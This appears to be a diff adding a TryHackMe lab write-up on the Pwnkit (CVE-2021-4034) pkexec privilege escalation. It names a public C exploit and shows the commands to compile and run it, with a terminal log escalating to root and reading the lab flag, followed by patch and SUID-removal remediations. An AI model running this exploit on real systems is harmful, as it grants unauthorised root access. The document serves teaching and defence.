@@ -52,3 +52,119 @@ pkexec
 
 
 
+## Exploitation
+
+Exploiting Pwnkit is, lamentably, incredibly easy.
+
+There are many exploits available online, and writing your own version is not particularly difficult.
+
+The version that we will be using is written in C by arthepsy, and was released soon after the Qualys security advisory was made public. The repository can be found here. This variation of the exploit makes use of the dangerous GCONV_PATH variable to include a malicious shared object file that calls the /bin/sh shell with root permissions.
+
+Once connected, we need to navigate to the pre-added pwnkit/ subdirectory, then compile the exploit using the following command:
+```
+gcc cve-2021-4034-poc.c -o exploit
+```
+
+We can then run the exploit with ./exploit to obtain instant root access over the target!
+
+The entire process can be seen in the clip below:
+
+```bash
+|  _ \__      ___ __ | | _(_) |_ 
+| |_) \ \ /\ / / '_ \| |/ / | __|
+|  __/ \ V  V /| | | |   <| | |_ 
+|_|     \_/\_/ |_| |_|_|\_\_|\__|
+ 
+
+tryhackme@pwnkit:~$ 
+tryhackme@pwnkit:~$ ls
+pwnkit
+tryhackme@pwnkit:~$ cd pwnkit/
+tryhackme@pwnkit:~/pwnkit$ ls
+README.md  cve-2021-4034-poc.c
+tryhackme@pwnkit:~/pwnkit$ uname -a
+Linux pwnkit 5.4.0-1029-aws #30-Ubuntu SMP Tue Oct 20 10:06:38 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+tryhackme@pwnkit:~/pwnkit$ cat /etc/os-release 
+NAME="Ubuntu"
+VERSION="20.04.1 LTS (Focal Fossa)"
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME="Ubuntu 20.04.1 LTS"
+VERSION_ID="20.04"
+HOME_URL="https://www.ubuntu.com/"
+SUPPORT_URL="https://help.ubuntu.com/"
+BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
+PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
+VERSION_CODENAME=focal
+UBUNTU_CODENAME=focal
+tryhackme@pwnkit:~/pwnkit$ 
+
+tryhackme@pwnkit:~/pwnkit$ ls -latr
+total 20
+-rw-rw-r-- 1 tryhackme tryhackme 1267 Jan 26  2022 cve-2021-4034-poc.c
+-rw-rw-r-- 1 tryhackme tryhackme 1271 Jan 26  2022 README.md
+drwxrwxr-x 8 tryhackme tryhackme 4096 Jan 26  2022 .git
+drwxr-xr-x 5 tryhackme tryhackme 4096 Jan 26  2022 ..
+drwxrwxr-x 3 tryhackme tryhackme 4096 Jan 27  2022 .
+tryhackme@pwnkit:~/pwnkit$ whoami; id
+tryhackme
+uid=1000(tryhackme) gid=1000(tryhackme) groups=1000(tryhackme)
+tryhackme@pwnkit:~/pwnkit$ gcc cve-2021-4034-poc.c -o exploit
+tryhackme@pwnkit:~/pwnkit$ ./exploit 
+# whoami; id
+root
+uid=0(root) gid=0(root) groups=0(root),1000(tryhackme)
+# 
+# cd /root
+# ls
+flag.txt  snap
+# cat flag.txt
+THM{CONGRATULATIONS-YOU-EXPLOITED-PWNKIT}
+# 
+
+
+
+
+
+
+```
+
+
+references:
+- https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
+
+## Tutorial and Remediations
+
+Fortunately, developers tend to be fairly fast when it comes to developing patches for critical vulnerabilities. As a prime example: at the time of writing, Canonical have already released patched versions of the Polkit package in the APT package manager for all versions of Ubuntu which are not end-of-life. The patched version can be installed with a simple apt upgrade — e.g. 
+
+```
+sudo apt update && sudo apt upgrade.
+```
+
+In distributions which have not yet released patched versions of the package, the recommended hotfix is to simply remove the SUID bit from the pkexec binary. This can be done with a command such as the following:
+
+```
+sudo chmod 0755 `which pkexec`
+```
+This is far from ideal, however, it works as a temporary solution until more distributions start packaging versions of polkit that are patched against Pwnkit.
+
+It should be noted that there are many variations of the Pwnkit exploit using different environment variables and exploiting the vulnerability in different ways. Some of these leave traces and logs behind, others do not.
+
+You can check to ensure that a system is patched by attempting to run a copy of the exploit against it. If the exploit returns the pkexec help menu then the system is patched:
+
+
+```
+# sudo chmod 0755 `which pkexec`
+# 
+tryhackme@pwnkit:~/pwnkit$ id
+uid=1000(tryhackme) gid=1000(tryhackme) groups=1000(tryhackme)
+tryhackme@pwnkit:~/pwnkit$ ./exploit 
+GLib: Cannot convert message: Could not open converter from “UTF-8” to “PWNKIT”
+pkexec must be setuid root
+tryhackme@pwnkit:~/pwnkit$ 
+```
+
+
+## Recommended 
+- https://tryhackme.com/r/room/polkit
+  
